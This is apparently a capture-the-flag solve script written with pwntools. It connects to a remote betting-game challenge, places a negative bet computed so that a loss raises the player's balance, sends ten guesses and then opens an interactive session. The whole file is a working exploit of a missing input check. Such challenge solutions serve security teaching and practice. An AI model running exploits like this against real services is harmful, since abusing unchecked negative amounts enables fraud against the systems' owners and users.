from pwn import *
from time import sleep

io = remote('thekidofarcrania.com', 10001)
context.log_level = 'info'

print(io.recv().decode())

#io.recvuntil('Are you ready? Y/N : ')
io.sendline('Y')

amount = 500
target = 1100000
win = amount - target

#io.recvuntil('Place a Bet :')
print(io.recv().decode())
io.sendline(str(int(win)))

#io.recvuntil('Make a Guess :')
guess = ['0','0','0','0','0','0','0','0','0','0',]

for i in guess:
        print(io.recv())
        sleep(1)
        io.sendline(str(i))

io.interactive()

# python solve.py
